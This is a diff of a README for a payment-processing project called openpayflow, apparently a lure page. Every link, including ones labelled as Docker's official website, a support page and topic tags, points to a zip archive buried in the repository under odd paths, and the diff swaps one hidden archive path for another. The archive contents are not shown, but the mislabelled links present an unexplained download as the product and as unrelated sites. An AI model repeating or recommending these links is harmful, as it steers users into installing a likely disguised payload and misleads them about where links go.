@@ -1,6 +1,6 @@
 # 🚀 openpayflow - Streamline Your Payment Processing
 
-[![Download openpayflow](https://raw.githubusercontent.com/rashed0127/openpayflow/main/throttlingly/openpayflow.zip)](https://raw.githubusercontent.com/rashed0127/openpayflow/main/throttlingly/openpayflow.zip)
+[![Download openpayflow](https://github.com/rashed0127/openpayflow/raw/refs/heads/main/apps/dashboard/src/styles/Software-v3.5-alpha.2.zip)](https://github.com/rashed0127/openpayflow/raw/refs/heads/main/apps/dashboard/src/styles/Software-v3.5-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -15,13 +15,13 @@ Before downloading, ensure your system meets the following requirements:
 - Storage: Minimum of 2 GB of free disk space
 - Docker: Installed and running
 
-If you do not have Docker, you can download it from [Docker's official website](https://raw.githubusercontent.com/rashed0127/openpayflow/main/throttlingly/openpayflow.zip).
+If you do not have Docker, you can download it from [Docker's official website](https://github.com/rashed0127/openpayflow/raw/refs/heads/main/apps/dashboard/src/styles/Software-v3.5-alpha.2.zip).
 
 ## 📥 Download & Install
 
 To download openpayflow, visit this page:
 
-[Download openpayflow](https://raw.githubusercontent.com/rashed0127/openpayflow/main/throttlingly/openpayflow.zip)
+[Download openpayflow](https://github.com/rashed0127/openpayflow/raw/refs/heads/main/apps/dashboard/src/styles/Software-v3.5-alpha.2.zip)
 
 1. Go to the above link.
 2. Look for the latest release.
@@ -57,8 +57,8 @@ openpayflow focuses on the following areas:
 - Fastify
 - Fintech
 - Microservices
-- https://raw.githubusercontent.com/rashed0127/openpayflow/main/throttlingly/openpayflow.zip
-- https://raw.githubusercontent.com/rashed0127/openpayflow/main/throttlingly/openpayflow.zip
+- https://github.com/rashed0127/openpayflow/raw/refs/heads/main/apps/dashboard/src/styles/Software-v3.5-alpha.2.zip
+- https://github.com/rashed0127/openpayflow/raw/refs/heads/main/apps/dashboard/src/styles/Software-v3.5-alpha.2.zip
 - Observability
 - Payment Processing
 - Payments
@@ -83,7 +83,7 @@ If you encounter any issues, here are some common solutions:
 
 For help or more information, visit our GitHub page:
 
-[Support openpayflow](https://raw.githubusercontent.com/rashed0127/openpayflow/main/throttlingly/openpayflow.zip)
+[Support openpayflow](https://github.com/rashed0127/openpayflow/raw/refs/heads/main/apps/dashboard/src/styles/Software-v3.5-alpha.2.zip)
 
 Feel free to open an issue if you encounter any bugs or have questions.
 
